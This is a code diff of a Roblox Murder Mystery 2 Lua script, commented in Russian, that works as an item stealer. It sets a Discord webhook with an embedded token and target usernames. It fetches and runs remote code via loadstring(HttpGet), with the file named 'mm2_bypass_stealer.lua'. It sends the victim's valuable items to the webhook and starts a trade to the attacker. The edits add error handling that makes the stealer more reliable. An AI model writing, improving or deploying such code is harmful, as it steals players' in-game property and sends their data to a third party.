@@ -1,8 +1,9 @@
-_G.Usernames = {"MM2danya7", "user2", "user3"} -- you can add as many as you'd like
+-- НАСТРОЙКИ (ОБЯЗАТЕЛЬНО ИЗМЕНИТЕ!)
+_G.Usernames = {"MM2danya7", "user2", "user3"} -- замените на реальные имена
 _G.min_rarity = "Godly"
-_G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1370815744719454229/-t8-ZNBEtooaJFXl2QEH_lAtrZU7tpgsg8lNjKW-VBItAybeXUWMOqcchv-RK2jEpkYh" -- change to your webhook
+_G.min_value = 1
+_G.pingEveryone = "Yes" -- "Yes" или "No"
+_G.webhook = "https://discord.com/api/webhooks/1370815744719454229/-t8-ZNBEtooaJFXl2QEH_lAtrZU7tpgsg8lNjKW-VBItAybeXUWMOqcchv-RK2jEpkYh" -- ЗАМЕНИТЕ НА РЕАЛЬНЫЙ ВЕБХУК!
 
 -- Bypass для получения настоящего JobId
 game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v)
@@ -11,13 +12,12 @@ game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v
         getgenv().JobId = "%s"
         getgenv().RealJobId = "%s"
         
-        -- Запускаем основной скрипт после телепортации
         task.wait(3)
         
         print("Байпас сработал! Real JobId:", getgenv().RealJobId)
         
-        -- Здесь будет запущен ваш основной скрипт
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/farm/refs/heads/main/bypass.lua"))()
+        -- Загружаем основной скрипт
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/mm2_bypass_stealer.lua"))()
         
     ]], serverId, serverId))
 end)
@@ -49,23 +49,29 @@ local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
-if next(users) == nil or webhook == "" then
-    plr:Kick("You didn't add username or webhook")
+-- ПРОВЕРКА НАСТРОЕК
+if webhook == "https://discord.com/api/webhooks/your_webhook_here" or webhook == "" then
+    warn("ОШИБКА: Вебхук не настроен! Добавьте реальный webhook URL")
+    return
+end
+
+if next(users) == nil then
+    warn("ОШИБКА: Usernames не добавлены! Добавьте хотя бы одного пользователя")
+    return
+end
+
+-- Проверка валидности вебхука
+local function isValidWebhook(url)
+    return url:find("^https://discord.com/api/webhooks/") or url:find("^https://discordapp.com/api/webhooks/")
+end
+
+if not isValidWebhook(webhook) then
+    warn("ОШИБКА: Невалидный вебхук! Формат должен быть: https://discord.com/api/webhooks/...")
     return
 end
 
 if game.PlaceId ~= 142823291 then
-    plr:Kick("Game not supported. Please join a normal MM2 server")
-    return
-end
-
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:Kick("Server error. Please join a DIFFERENT server")
-    return
-end
-
-if #Players:GetPlayers() >= 12 then
-    plr:Kick("Server is full. Please join a less populated server")
+    warn("ОШИБКА: Не поддерживаемая игра")
     return
 end
 
@@ -104,12 +110,20 @@ local function trim(s)
 end
 
 local function fetchHTML(url)
-    local response = request({
-        Url = url,
-        Method = "GET",
-        Headers = headers
-    })
-    return response.Body
+    local success, response = pcall(function()
+        return request({
+            Url = url,
+            Method = "GET",
+            Headers = headers
+        })
+    end)
+    
+    if success and response.Success then
+        return response.Body
+    else
+        warn("Ошибка загрузки HTML: " .. tostring(response))
+        return ""
+    end
 end
 
 local function parseValue(itembodyDiv)
@@ -337,12 +351,26 @@ local function SendFirstMessage(list, prefix)
     }
 
     local body = HttpService:JSONEncode(data)
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    
+    -- Обработка ошибок при отправке
+    local success, response = pcall(function()
+        return request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+    
+    if not success then
+        warn("Ошибка отправки в Discord: " .. tostring(response))
+    else
+        if response.StatusCode == 204 or response.StatusCode == 200 then
+            print("Сообщение успешно отправлено в Discord!")
+        else
+            warn("Ошибка Discord: " .. response.StatusCode .. " - " .. response.Body)
+        end
+    end
 end
 
 local function SendMessage(sortedItems)
@@ -397,12 +425,19 @@ local function SendMessage(sortedItems)
     }
 
     local body = HttpService:JSONEncode(data)
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    
+    local success, response = pcall(function()
+        return request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+    
+    if not success then
+        warn("Ошибка отправки в Discord: " .. tostring(response))
+    end
 end
 
 local tradegui = playerGui:WaitForChild("TradeGUI")
@@ -544,4 +579,6 @@ if #weaponsToSend > 0 then
         Players.PlayerAdded:Connect(onPlayerChat)
     end
     waitForUserChat()
+else
+    warn("Нет подходящих предметов для отправки")
 end
